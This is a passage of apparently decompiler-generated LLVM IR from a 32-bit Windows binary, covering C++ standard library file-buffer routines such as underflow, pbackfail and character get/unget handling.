  store i32 %ecx.3.reload, i32* %ecx.0.reg2mem, !insn.addr !7860
  store i32 %86, i32* %esp.1.reg2mem, !insn.addr !7860
  store i32 %eax.1.reload, i32* %eax.0.reg2mem, !insn.addr !7860
  br i1 %120, label %dec_label_pc_1000db02, label %dec_label_pc_1000db9b, !insn.addr !7860

dec_label_pc_1000db9b:                            ; preds = %dec_label_pc_1000db93
  %121 = load i32, i32* %47, align 4, !insn.addr !7861
  %122 = icmp ult i32 %121, 32, !insn.addr !7861
  %123 = icmp eq i1 %122, false, !insn.addr !7862
  br i1 %123, label %dec_label_pc_1000dbcd, label %dec_label_pc_1000dba1, !insn.addr !7862

dec_label_pc_1000dba1:                            ; preds = %dec_label_pc_1000db9b
  %124 = add i32 %esp.1.reload, -32, !insn.addr !7863
  %125 = inttoptr i32 %124 to i32*, !insn.addr !7863
  store i32 %96, i32* %125, align 4, !insn.addr !7863
  %126 = add i32 %esp.1.reload, -36, !insn.addr !7864
  %127 = inttoptr i32 %126 to i32*, !insn.addr !7864
  store i32 8, i32* %127, align 4, !insn.addr !7864
  %128 = call i32 @function_10004360(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7865
  store i32 %126, i32* %esp.0.reg2mem, !insn.addr !7866
  br label %dec_label_pc_1000dafc, !insn.addr !7866

dec_label_pc_1000dbb1:                            ; preds = %dec_label_pc_1000db42
  %129 = icmp eq i32 %88, 3, !insn.addr !7867
  %130 = icmp eq i1 %129, false, !insn.addr !7868
  br i1 %130, label %dec_label_pc_1000dbcd, label %dec_label_pc_1000dbb6, !insn.addr !7868

dec_label_pc_1000dbb6:                            ; preds = %dec_label_pc_1000dbb1
  %131 = load i32, i32* %45, align 4, !insn.addr !7869
  %132 = add i32 %131, 76, !insn.addr !7870
  %133 = inttoptr i32 %132 to i32*, !insn.addr !7870
  %134 = load i32, i32* %133, align 4, !insn.addr !7870
  %135 = add i32 %esp.1.reload, -32, !insn.addr !7870
  %136 = inttoptr i32 %135 to i32*, !insn.addr !7870
  store i32 %134, i32* %136, align 4, !insn.addr !7870
  %137 = inttoptr i32 %52 to i32*, !insn.addr !7871
  %138 = load i32, i32* %137, align 4, !insn.addr !7871
  %139 = add i32 %esp.1.reload, -36, !insn.addr !7871
  %140 = inttoptr i32 %139 to i32*, !insn.addr !7871
  store i32 %138, i32* %140, align 4, !insn.addr !7871
  %141 = call i32 @"??$_Fputc@D@std@@YA_NDPAU_iobuf@@@Z"(i8 ptrtoint (i32* @1 to i8), i32* nonnull @1), !insn.addr !7872
  br label %dec_label_pc_1000dbcd

dec_label_pc_1000dbcd:                            ; preds = %dec_label_pc_1000db9b, %dec_label_pc_1000db87, %dec_label_pc_1000db5e, %dec_label_pc_1000db02, %dec_label_pc_1000dbb6, %dec_label_pc_1000dbb1
  %142 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !7873
  br label %dec_label_pc_1000dbd7, !insn.addr !7873

dec_label_pc_1000dbd7:                            ; preds = %dec_label_pc_1000dabc, %dec_label_pc_1000daa1, %dec_label_pc_1000dbcd, %dec_label_pc_1000da45, %dec_label_pc_1000da88
  %143 = call i32 @__EH_epilog3_GS(), !insn.addr !7874
  ret i32 %143, !insn.addr !7875
}

declare i32 @"?pbackfail@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHH@Z"(i32)

define i32 @function_1000dc66() local_unnamed_addr {
dec_label_pc_1000dc66:
  ret i32 -1, !insn.addr !7876
}

declare i32 @"?seekoff@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@_JHH@Z"(i64, i32, i32)

declare i32 @"?seekpos@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@V32@H@Z"(i32, i32)

declare i32 @"?setbuf@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@PAD_J@Z"(i8*, i64)

define i32 @function_1000de8f() local_unnamed_addr {
dec_label_pc_1000de8f:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !7877
}

define i32 @function_1000de94() {
dec_label_pc_1000de94:
  ret i32 0, !insn.addr !7878
}

declare i32 @"?sync@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ"()

define i32 @function_1000ded1() local_unnamed_addr {
dec_label_pc_1000ded1:
  ret i32 0, !insn.addr !7879
}

define i32 @function_1000ded4() {
dec_label_pc_1000ded4:
  %.reg2mem = alloca i32, !insn.addr !7880
  %esp.0.reg2mem = alloca i32, !insn.addr !7880
  %eax.1.reg2mem = alloca i32, !insn.addr !7880
  %ecx.218.reg2mem = alloca i32, !insn.addr !7880
  %esp.119.reg2mem = alloca i32, !insn.addr !7880
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  store i32 44, i32* %stack_var_-4, align 4, !insn.addr !7880
  %2 = call i32 @__EH_prolog3_GS(i32 44), !insn.addr !7881
  %3 = add i32 %1, 28, !insn.addr !7882
  %4 = inttoptr i32 %3 to i32*, !insn.addr !7882
  %5 = load i32, i32* %4, align 4, !insn.addr !7882
  %6 = inttoptr i32 %5 to i32*, !insn.addr !7883
  %7 = load i32, i32* %6, align 4, !insn.addr !7883
  %8 = icmp eq i32 %7, 0, !insn.addr !7884
  br i1 %8, label %dec_label_pc_1000df0e, label %dec_label_pc_1000deeb, !insn.addr !7885

dec_label_pc_1000deeb:                            ; preds = %dec_label_pc_1000ded4
  %9 = add i32 %1, 44, !insn.addr !7886
  %10 = inttoptr i32 %9 to i32*, !insn.addr !7886
  %11 = load i32, i32* %10, align 4, !insn.addr !7886
  %12 = inttoptr i32 %11 to i32*, !insn.addr !7887
  %13 = load i32, i32* %12, align 4, !insn.addr !7887
  %14 = add i32 %13, %7, !insn.addr !7888
  %15 = icmp ult i32 %7, %14, !insn.addr !7889
  %16 = icmp eq i1 %15, false, !insn.addr !7890
  br i1 %16, label %dec_label_pc_1000df0e, label %dec_label_pc_1000def7, !insn.addr !7890

dec_label_pc_1000def7:                            ; preds = %dec_label_pc_1000deeb
  %17 = add i32 %13, -1, !insn.addr !7891
  store i32 %17, i32* %12, align 4, !insn.addr !7892
  %18 = load i32, i32* %4, align 4, !insn.addr !7893
  %19 = inttoptr i32 %18 to i32*, !insn.addr !7894
  %20 = load i32, i32* %19, align 4, !insn.addr !7894
  %21 = add i32 %20, 1, !insn.addr !7895
  store i32 %21, i32* %19, align 4, !insn.addr !7896
  br label %dec_label_pc_1000dff9, !insn.addr !7897

dec_label_pc_1000df0e:                            ; preds = %dec_label_pc_1000deeb, %dec_label_pc_1000ded4
  %22 = add i32 %1, 76, !insn.addr !7898
  %23 = inttoptr i32 %22 to i32*, !insn.addr !7898
  %24 = load i32, i32* %23, align 4, !insn.addr !7898
  %25 = icmp eq i32 %24, 0, !insn.addr !7898
  %26 = icmp eq i1 %25, false, !insn.addr !7899
  br i1 %26, label %dec_label_pc_1000df1c, label %dec_label_pc_1000dff9, !insn.addr !7899

dec_label_pc_1000df1c:                            ; preds = %dec_label_pc_1000df0e
  %27 = call i32 @"?_Reset_back@?$basic_filebuf@DU?$char_traits@D@std@@@std@@AAEXXZ"(), !insn.addr !7900
  %28 = add i32 %1, 56, !insn.addr !7901
  %29 = inttoptr i32 %28 to i32*, !insn.addr !7901
  %30 = load i32, i32* %29, align 4, !insn.addr !7901
  %31 = icmp eq i32 %30, 0, !insn.addr !7901
  %32 = icmp eq i1 %31, false, !insn.addr !7902
  br i1 %32, label %dec_label_pc_1000df48, label %dec_label_pc_1000df2a, !insn.addr !7902

dec_label_pc_1000df2a:                            ; preds = %dec_label_pc_1000df1c
  %33 = load i32, i32* %23, align 4, !insn.addr !7903
  %34 = inttoptr i32 %33 to %_IO_FILE*, !insn.addr !7903
  %35 = add i32 %0, -42, !insn.addr !7904
  %36 = inttoptr i32 %35 to i8*, !insn.addr !7904
  store i8 0, i8* %36, align 1, !insn.addr !7904
  %37 = getelementptr inbounds %_IO_FILE, %_IO_FILE* %34, i32 0, i32 0
  %38 = call i32 @"??$_Fgetc@D@std@@YA_NAADPAU_iobuf@@@Z"(i8* %36, i32* %37), !insn.addr !7905
  br label %dec_label_pc_1000dff9

dec_label_pc_1000df48:                            ; preds = %dec_label_pc_1000df1c
  %39 = add i32 %0, -24, !insn.addr !7906
  %40 = inttoptr i32 %39 to i32*, !insn.addr !7906
  store i32 0, i32* %40, align 4, !insn.addr !7906
  %41 = add i32 %0, -20, !insn.addr !7907
  %42 = inttoptr i32 %41 to i32*, !insn.addr !7907
  store i32 15, i32* %42, align 4, !insn.addr !7907
  %43 = add i32 %0, -40, !insn.addr !7908
  %44 = inttoptr i32 %43 to i8*, !insn.addr !7908
  store i8 0, i8* %44, align 1, !insn.addr !7908
  %45 = load i32, i32* %23, align 4, !insn.addr !7909
  %46 = inttoptr i32 %45 to %_IO_FILE*, !insn.addr !7909
  %47 = add i32 %0, -4, !insn.addr !7910
  %48 = inttoptr i32 %47 to i32*, !insn.addr !7910
  store i32 0, i32* %48, align 4, !insn.addr !7910
  %49 = call i32 @_fgetc(%_IO_FILE* %46), !insn.addr !7911
  %50 = add i32 %0, -52, !insn.addr !7912
  %51 = inttoptr i32 %50 to i32*, !insn.addr !7912
  store i32 -1, i32* %51, align 4, !insn.addr !7912
  %52 = icmp eq i32 %49, -1, !insn.addr !7913
  %53 = icmp eq i1 %52, false, !insn.addr !7914
  store i32 -1, i32* %eax.1.reg2mem, !insn.addr !7914
  br i1 %53, label %dec_label_pc_1000df6e.lr.ph, label %dec_label_pc_1000dfeb, !insn.addr !7914

dec_label_pc_1000df6e.lr.ph:                      ; preds = %dec_label_pc_1000df48
  %54 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !7915
  %55 = inttoptr i32 %43 to i32*
  %56 = add i32 %0, -56
  %57 = add i32 %0, -41
  %58 = add i32 %0, -48
  %59 = add i32 %1, 64
  %60 = inttoptr i32 %56 to i32*
  %61 = inttoptr i32 %58 to i32*
  store i32 %54, i32* %esp.119.reg2mem
  store i32 %49, i32* %ecx.218.reg2mem
  br label %dec_label_pc_1000df6e

dec_label_pc_1000df6e:                            ; preds = %dec_label_pc_1000df6e.lr.ph, %dec_label_pc_1000e023
  %ecx.218.reload = load i32, i32* %ecx.218.reg2mem
  %esp.119.reload = load i32, i32* %esp.119.reg2mem
  %62 = add i32 %esp.119.reload, -4, !insn.addr !7916
  %63 = inttoptr i32 %62 to i32*, !insn.addr !7916
  store i32 %ecx.218.reload, i32* %63, align 4, !insn.addr !7916
  %64 = add i32 %esp.119.reload, -8, !insn.addr !7917
  %65 = inttoptr i32 %64 to i32*, !insn.addr !7917
  store i32 1, i32* %65, align 4, !insn.addr !7917
  %66 = call i32 @function_10004360(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7918
  %67 = load i32, i32* %42, align 4, !insn.addr !7919
  %68 = icmp ult i32 %67, 16, !insn.addr !7919
  %69 = load i32, i32* %55, align 4, !insn.addr !7920
  %70 = icmp eq i1 %68, false, !insn.addr !7921
  %spec.select = select i1 %70, i32 %69, i32 %43
  %71 = add i32 %esp.119.reload, -12, !insn.addr !7922
  %72 = inttoptr i32 %71 to i32*, !insn.addr !7922
  store i32 %56, i32* %72, align 4, !insn.addr !7922
  %73 = add i32 %esp.119.reload, -16, !insn.addr !7923
  %74 = inttoptr i32 %73 to i32*, !insn.addr !7923
  store i32 %43, i32* %74, align 4, !insn.addr !7923
  %75 = add i32 %esp.119.reload, -20, !insn.addr !7924
  %76 = inttoptr i32 %75 to i32*, !insn.addr !7924
  store i32 %57, i32* %76, align 4, !insn.addr !7924
  %77 = add i32 %esp.119.reload, -24, !insn.addr !7925
  %78 = inttoptr i32 %77 to i32*, !insn.addr !7925
  store i32 %58, i32* %78, align 4, !insn.addr !7925
  %79 = load i32, i32* %40, align 4, !insn.addr !7926
  %80 = add i32 %79, %spec.select, !insn.addr !7927
  %81 = add i32 %esp.119.reload, -28, !insn.addr !7928
  %82 = inttoptr i32 %81 to i32*, !insn.addr !7928
  store i32 %80, i32* %82, align 4, !insn.addr !7928
  %83 = add i32 %esp.119.reload, -32, !insn.addr !7929
  %84 = inttoptr i32 %83 to i32*, !insn.addr !7929
  store i32 %spec.select, i32* %84, align 4, !insn.addr !7929
  %85 = add i32 %esp.119.reload, -36, !insn.addr !7930
  %86 = inttoptr i32 %85 to i32*, !insn.addr !7930
  store i32 %59, i32* %86, align 4, !insn.addr !7930
  %87 = call i32 @"@_guard_check_icall@4"(), !insn.addr !7931
  %88 = icmp slt i32 %87, 0, !insn.addr !7932
  br i1 %88, label %dec_label_pc_1000dfee, label %dec_label_pc_1000dfba, !insn.addr !7933

dec_label_pc_1000dfba:                            ; preds = %dec_label_pc_1000df6e
  %89 = icmp slt i32 %87, 2, !insn.addr !7934
  br i1 %89, label %dec_label_pc_1000dfff, label %dec_label_pc_1000dfbf, !insn.addr !7934

dec_label_pc_1000dfbf:                            ; preds = %dec_label_pc_1000dfba
  %90 = icmp eq i32 %87, 3, !insn.addr !7935
  %91 = icmp eq i1 %90, false, !insn.addr !7936
  br i1 %91, label %dec_label_pc_1000dfee, label %dec_label_pc_1000dfc4, !insn.addr !7936

dec_label_pc_1000dfc4:                            ; preds = %dec_label_pc_1000dfbf
  %92 = load i32, i32* %40, align 4, !insn.addr !7937
  %93 = icmp eq i32 %92, 0, !insn.addr !7937
  store i32 %85, i32* %esp.0.reg2mem, !insn.addr !7938
  br i1 %93, label %dec_label_pc_1000e023, label %dec_label_pc_1000dfca, !insn.addr !7938

dec_label_pc_1000dfca:                            ; preds = %dec_label_pc_1000dfc4
  %94 = load i32, i32* %42, align 4, !insn.addr !7939
  %95 = icmp ult i32 %94, 16, !insn.addr !7939
  %96 = load i32, i32* %55, align 4, !insn.addr !7940
  %97 = icmp eq i1 %95, false, !insn.addr !7941
  %spec.select4 = select i1 %97, i32 %96, i32 %43
  %98 = add i32 %esp.119.reload, -40, !insn.addr !7942
  %99 = inttoptr i32 %98 to i32*, !insn.addr !7942
  store i32 1, i32* %99, align 4, !insn.addr !7942
  %100 = add i32 %esp.119.reload, -44, !insn.addr !7943
  %101 = inttoptr i32 %100 to i32*, !insn.addr !7943
  store i32 %spec.select4, i32* %101, align 4, !insn.addr !7943
  %102 = add i32 %esp.119.reload, -48, !insn.addr !7944
  %103 = inttoptr i32 %102 to i32*, !insn.addr !7944
  store i32 1, i32* %103, align 4, !insn.addr !7944
  %104 = add i32 %esp.119.reload, -52, !insn.addr !7945
  %105 = inttoptr i32 %104 to i32*, !insn.addr !7945
  store i32 %57, i32* %105, align 4, !insn.addr !7945
  %106 = call i32 @_memcpy_s(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, i32 ptrtoint (i32* @1 to i32)), !insn.addr !7946
  br label %dec_label_pc_1000dfe7, !insn.addr !7947

dec_label_pc_1000dfe7:                            ; preds = %dec_label_pc_1000e066, %dec_label_pc_1000e052.preheader, %dec_label_pc_1000e03b, %dec_label_pc_1000dfca
  %107 = inttoptr i32 %57 to i8*, !insn.addr !7948
  %108 = load i8, i8* %107, align 1, !insn.addr !7948
  %109 = zext i8 %108 to i32, !insn.addr !7948
  store i32 %109, i32* %eax.1.reg2mem, !insn.addr !7948
  br label %dec_label_pc_1000dfeb, !insn.addr !7948

dec_label_pc_1000dfeb:                            ; preds = %dec_label_pc_1000e023, %dec_label_pc_1000df48, %dec_label_pc_1000dfe7
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  store i32 %eax.1.reload, i32* %51, align 4, !insn.addr !7949
  br label %dec_label_pc_1000dfee, !insn.addr !7949

dec_label_pc_1000dfee:                            ; preds = %dec_label_pc_1000dfbf, %dec_label_pc_1000df6e, %dec_label_pc_1000dfeb
  %110 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !7950
  br label %dec_label_pc_1000dff9, !insn.addr !7951

dec_label_pc_1000dff9:                            ; preds = %dec_label_pc_1000df2a, %dec_label_pc_1000df0e, %dec_label_pc_1000dfee, %dec_label_pc_1000def7
  %111 = call i32 @__EH_epilog3_GS(), !insn.addr !7952
  ret i32 %111, !insn.addr !7953

dec_label_pc_1000dfff:                            ; preds = %dec_label_pc_1000dfba
  %112 = load i32, i32* %55, align 4, !insn.addr !7954
  %113 = load i32, i32* %60, align 4, !insn.addr !7955
  %114 = icmp eq i32 %113, %57, !insn.addr !7955
  %115 = icmp eq i1 %114, false, !insn.addr !7956
  %116 = load i32, i32* %42, align 4
  %117 = icmp ult i32 %116, 16
  %118 = icmp eq i1 %117, false
  %spec.select6 = select i1 %118, i32 %112, i32 %43
  br i1 %115, label %dec_label_pc_1000e03b, label %dec_label_pc_1000e00a, !insn.addr !7956

dec_label_pc_1000e00a:                            ; preds = %dec_label_pc_1000dfff
  %119 = load i32, i32* %61, align 4, !insn.addr !7957
  %120 = sub i32 %119, %spec.select6, !insn.addr !7958
  %121 = add i32 %esp.119.reload, -40, !insn.addr !7959
  %122 = inttoptr i32 %121 to i32*, !insn.addr !7959
  store i32 %120, i32* %122, align 4, !insn.addr !7959
  %123 = add i32 %esp.119.reload, -44, !insn.addr !7960
  %124 = inttoptr i32 %123 to i32*, !insn.addr !7960
  store i32 0, i32* %124, align 4, !insn.addr !7960
  %125 = call i32 @function_100063e0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7961
  store i32 %123, i32* %esp.0.reg2mem, !insn.addr !7961
  br label %dec_label_pc_1000e023, !insn.addr !7961

dec_label_pc_1000e023:                            ; preds = %dec_label_pc_1000e00a, %dec_label_pc_1000dfc4
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %126 = load i32, i32* %23, align 4, !insn.addr !7962
  %127 = add i32 %esp.0.reload, -4, !insn.addr !7962
  %128 = inttoptr i32 %127 to i32*, !insn.addr !7962
  store i32 %126, i32* %128, align 4, !insn.addr !7962
  %129 = call i32 @_fgetc(%_IO_FILE* bitcast (i32* @1 to %_IO_FILE*)), !insn.addr !7963
  %130 = icmp eq i32 %129, -1, !insn.addr !7913
  %131 = icmp eq i1 %130, false, !insn.addr !7914
  store i32 %esp.0.reload, i32* %esp.119.reg2mem, !insn.addr !7914
  store i32 %129, i32* %ecx.218.reg2mem, !insn.addr !7914
  store i32 -1, i32* %eax.1.reg2mem, !insn.addr !7914
  br i1 %131, label %dec_label_pc_1000df6e, label %dec_label_pc_1000dfeb, !insn.addr !7914

dec_label_pc_1000e03b:                            ; preds = %dec_label_pc_1000dfff
  %132 = load i32, i32* %40, align 4, !insn.addr !7964
  %133 = load i32, i32* %61, align 4, !insn.addr !7965
  %134 = sub i32 %132, %133, !insn.addr !7966
  %135 = add i32 %134, %spec.select6, !insn.addr !7967
  %136 = icmp slt i32 %135, 1
  br i1 %136, label %dec_label_pc_1000dfe7, label %dec_label_pc_1000e052.preheader, !insn.addr !7968

dec_label_pc_1000e052.preheader:                  ; preds = %dec_label_pc_1000e03b
  %137 = load i32, i32* %23, align 4, !insn.addr !7969
  %138 = add i32 %esp.119.reload, -40, !insn.addr !7969
  %139 = inttoptr i32 %138 to i32*, !insn.addr !7969
  store i32 %137, i32* %139, align 4, !insn.addr !7969
  %140 = add i32 %135, -1, !insn.addr !7970
  %141 = add i32 %140, %133, !insn.addr !7971
  %142 = inttoptr i32 %141 to i8*, !insn.addr !7971
  %143 = load i8, i8* %142, align 1, !insn.addr !7971
  %144 = sext i8 %143 to i32, !insn.addr !7971
  %145 = add i32 %esp.119.reload, -44, !insn.addr !7972
  %146 = inttoptr i32 %145 to i32*, !insn.addr !7972
  store i32 %144, i32* %146, align 4, !insn.addr !7972
  %147 = call i32 @_ungetc(i32 ptrtoint (i32* @1 to i32), %_IO_FILE* bitcast (i32* @1 to %_IO_FILE*)), !insn.addr !7973
  %148 = icmp slt i32 %140, 1
  store i32 %140, i32* %.reg2mem, !insn.addr !7974
  br i1 %148, label %dec_label_pc_1000dfe7, label %dec_label_pc_1000e066, !insn.addr !7974

dec_label_pc_1000e066:                            ; preds = %dec_label_pc_1000e052.preheader, %dec_label_pc_1000e066
  %.reload = load i32, i32* %.reg2mem
  %149 = load i32, i32* %61, align 4, !insn.addr !7975
  %150 = load i32, i32* %23, align 4, !insn.addr !7969
  store i32 %150, i32* %139, align 4, !insn.addr !7969
  %151 = add i32 %.reload, -1, !insn.addr !7970
  %152 = add i32 %151, %149, !insn.addr !7971
  %153 = inttoptr i32 %152 to i8*, !insn.addr !7971
  %154 = load i8, i8* %153, align 1, !insn.addr !7971
  %155 = sext i8 %154 to i32, !insn.addr !7971
  store i32 %155, i32* %146, align 4, !insn.addr !7972
  %156 = call i32 @_ungetc(i32 ptrtoint (i32* @1 to i32), %_IO_FILE* bitcast (i32* @1 to %_IO_FILE*)), !insn.addr !7973
  %157 = icmp slt i32 %151, 1
  store i32 %151, i32* %.reg2mem, !insn.addr !7974
  br i1 %157, label %dec_label_pc_1000dfe7, label %dec_label_pc_1000e066, !insn.addr !7974
}

declare i32 @"?underflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ"()

define i32 @function_1000e0eb() local_unnamed_addr {
dec_label_pc_1000e0eb:
  ret i32 -1, !insn.addr !7976
}

define i32 @function_1000e0ef(i32 %arg1, i32 %arg2, i32 %arg3) {
dec_label_pc_1000e0ef:
  %ecx.3.reg2mem = alloca i32, !insn.addr !7977
  %edi.1.reg2mem = alloca i32, !insn.addr !7977
  %ebx.1.reg2mem = alloca i32, !insn.addr !7977
  %stack_var_4.1.reg2mem = alloca i32, !insn.addr !7977
  %stack_var_-8.1.reg2mem = alloca i32, !insn.addr !7977
  %esi.0.reg2mem = alloca i32, !insn.addr !7977
  %stack_var_-20.0.reg2mem = alloca i32, !insn.addr !7977
  %storemerge9.reg2mem = alloca i32, !insn.addr !7977
  %.reg2mem = alloca i32, !insn.addr !7977
  %edi.0.reg2mem = alloca i32, !insn.addr !7977
  %ebx.0.reg2mem = alloca i32, !insn.addr !7977
  %stack_var_4.0.reg2mem = alloca i32, !insn.addr !7977
  %stack_var_-8.0.reg2mem = alloca i32, !insn.addr !7977
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-36 = alloca i32, align 4
  %1 = icmp slt i32 %arg3, 0, !insn.addr !7978
  store i32 0, i32* %ecx.3.reg2mem, !insn.addr !7979
  br i1 %1, label %dec_label_pc_1000e1d4, label %dec_label_pc_1000e10e, !insn.addr !7979

dec_label_pc_1000e10e:                            ; preds = %dec_label_pc_1000e0ef
  %2 = icmp eq i32 %arg3, 0, !insn.addr !7978
  %3 = icmp eq i1 %2, false, !insn.addr !7980
  %4 = icmp ne i1 %3, true, !insn.addr !7980
  %5 = icmp eq i32 %arg2, 0, !insn.addr !7981
  %or.cond = icmp eq i1 %5, %4
  store i32 0, i32* %ecx.3.reg2mem, !insn.addr !7980
  br i1 %or.cond, label %dec_label_pc_1000e1d4, label %dec_label_pc_1000e11c, !insn.addr !7980

dec_label_pc_1000e11c:                            ; preds = %dec_label_pc_1000e10e
  %6 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !7982
  %7 = add i32 %0, 28, !insn.addr !7983
  %8 = inttoptr i32 %7 to i32*, !insn.addr !7983
  %9 = add i32 %0, 44
  %10 = inttoptr i32 %9 to i32*
  %11 = add i32 %6, -4
  %12 = inttoptr i32 %11 to i32*
  %13 = add i32 %6, -8
  %14 = inttoptr i32 %13 to i32*
  %15 = add i32 %6, -12
  %16 = inttoptr i32 %15 to i32*
  store i32 0, i32* %stack_var_-8.0.reg2mem, !insn.addr !7982
  store i32 %arg1, i32* %stack_var_4.0.reg2mem, !insn.addr !7982
  store i32 %arg3, i32* %ebx.0.reg2mem, !insn.addr !7982
  store i32 %arg2, i32* %edi.0.reg2mem, !insn.addr !7982
  br label %dec_label_pc_1000e120, !insn.addr !7982

dec_label_pc_1000e120:                            ; preds = %dec_label_pc_1000e120.backedge, %dec_label_pc_1000e11c
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %stack_var_4.0.reload = load i32, i32* %stack_var_4.0.reg2mem
  %stack_var_-8.0.reload = load i32, i32* %stack_var_-8.0.reg2mem
  %17 = load i32, i32* %8, align 4, !insn.addr !7983
  %18 = inttoptr i32 %17 to i32*, !insn.addr !7984
  %19 = load i32, i32* %18, align 4, !insn.addr !7984
  %20 = icmp eq i32 %19, 0, !insn.addr !7985
  store i32 0, i32* %.reg2mem, !insn.addr !7986
  store i32 0, i32* %storemerge9.reg2mem, !insn.addr !7986
  br i1 %20, label %dec_label_pc_1000e141, label %dec_label_pc_1000e135, !insn.addr !7986

dec_label_pc_1000e135:                            ; preds = %dec_label_pc_1000e120
  %21 = load i32, i32* %10, align 4, !insn.addr !7987
  %22 = inttoptr i32 %21 to i32*, !insn.addr !7988
  %23 = load i32, i32* %22, align 4, !insn.addr !7988
  %24 = ashr i32 %23, 31, !insn.addr !7989
  %25 = icmp slt i32 %23, 0, !insn.addr !7990
  store i32 %24, i32* %.reg2mem, !insn.addr !7991
  store i32 %23, i32* %storemerge9.reg2mem, !insn.addr !7991
  br i1 %25, label %dec_label_pc_1000e188, label %dec_label_pc_1000e141, !insn.addr !7991

dec_label_pc_1000e141:                            ; preds = %dec_label_pc_1000e120, %dec_label_pc_1000e135
  %storemerge9.reload = load i32, i32* %storemerge9.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 0, !insn.addr !7990
  %27 = icmp eq i1 %26, false, !insn.addr !7992
  %28 = icmp ne i1 %27, true, !insn.addr !7992
  %29 = icmp eq i32 %storemerge9.reload, 0, !insn.addr !7993
  %or.cond3 = icmp eq i1 %29, %28
  br i1 %or.cond3, label %dec_label_pc_1000e188, label %dec_label_pc_1000e147, !insn.addr !7992

dec_label_pc_1000e147:                            ; preds = %dec_label_pc_1000e141
  %30 = icmp sgt i32 %ebx.0.reload, %.reload, !insn.addr !7994
  store i32 %.reload, i32* %stack_var_-20.0.reg2mem, !insn.addr !7994
  store i32 %storemerge9.reload, i32* %esi.0.reg2mem, !insn.addr !7994
  br i1 %30, label %dec_label_pc_1000e156, label %dec_label_pc_1000e14b, !insn.addr !7994

dec_label_pc_1000e14b:                            ; preds = %dec_label_pc_1000e147
  %31 = icmp sge i32 %ebx.0.reload, %.reload, !insn.addr !7995
  %32 = icmp ult i32 %edi.0.reload, %storemerge9.reload, !insn.addr !7996
  %33 = icmp eq i1 %32, false, !insn.addr !7997
  %or.cond5 = icmp eq i1 %31, %33
  %spec.select = select i1 %or.cond5, i32 %.reload, i32 %ebx.0.reload
  %spec.select8 = select i1 %or.cond5, i32 %storemerge9.reload, i32 %edi.0.reload
  store i32 %spec.select, i32* %stack_var_-20.0.reg2mem
  store i32 %spec.select8, i32* %esi.0.reg2mem
  br label %dec_label_pc_1000e156

dec_label_pc_1000e156:                            ; preds = %dec_label_pc_1000e14b, %dec_label_pc_1000e147
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %stack_var_-20.0.reload = load i32, i32* %stack_var_-20.0.reg2mem
  store i32 %esi.0.reload, i32* %12, align 4, !insn.addr !7998
  store i32 %19, i32* %14, align 4, !insn.addr !7999
  store i32 %stack_var_4.0.reload, i32* %16, align 4, !insn.addr !8000
  %34 = call i32 @_memcpy.12(), !insn.addr !8001
  %35 = add i32 %esi.0.reload, %stack_var_4.0.reload, !insn.addr !8002
  %36 = add i32 %esi.0.reload, %stack_var_-8.0.reload, !insn.addr !8003
  %37 = sub i32 %edi.0.reload, %esi.0.reload, !insn.addr !8004
  %38 = icmp ult i32 %edi.0.reload, %esi.0.reload, !insn.addr !8004
  %39 = load i32, i32* %10, align 4, !insn.addr !8005
  %.neg = sext i1 %38 to i32
  %.neg10 = sub i32 %ebx.0.reload, %stack_var_-20.0.reload, !insn.addr !8006
  %40 = add i32 %.neg10, %.neg, !insn.addr !8006
  %41 = inttoptr i32 %39 to i32*, !insn.addr !8007
  %42 = load i32, i32* %41, align 4, !insn.addr !8007
  %43 = sub i32 %42, %esi.0.reload, !insn.addr !8007
  store i32 %43, i32* %41, align 4, !insn.addr !8007
  %44 = load i32, i32* %8, align 4, !insn.addr !8008
  %45 = inttoptr i32 %44 to i32*, !insn.addr !8009
  %46 = load i32, i32* %45, align 4, !insn.addr !8009
  %47 = add i32 %46, %esi.0.reload, !insn.addr !8009
  store i32 %47, i32* %45, align 4, !insn.addr !8009
  store i32 %36, i32* %stack_var_-8.1.reg2mem, !insn.addr !8010
  store i32 %35, i32* %stack_var_4.1.reg2mem, !insn.addr !8010
  store i32 %40, i32* %ebx.1.reg2mem, !insn.addr !8010
  store i32 %37, i32* %edi.1.reg2mem, !insn.addr !8010
  br label %dec_label_pc_1000e1ba, !insn.addr !8010

dec_label_pc_1000e188:                            ; preds = %dec_label_pc_1000e141, %dec_label_pc_1000e135
  %48 = call i32 @"@_guard_check_icall@4"(), !insn.addr !8011
  %49 = icmp eq i32 %48, -1, !insn.addr !8012
  store i32 %stack_var_-8.0.reload, i32* %ecx.3.reg2mem, !insn.addr !8013
  br i1 %49, label %dec_label_pc_1000e1d4, label %dec_label_pc_1000e1a0, !insn.addr !8013

dec_label_pc_1000e1a0:                            ; preds = %dec_label_pc_1000e188
  %50 = trunc i32 %48 to i8, !insn.addr !8014
  %51 = inttoptr i32 %stack_var_4.0.reload to i8*, !insn.addr !8014
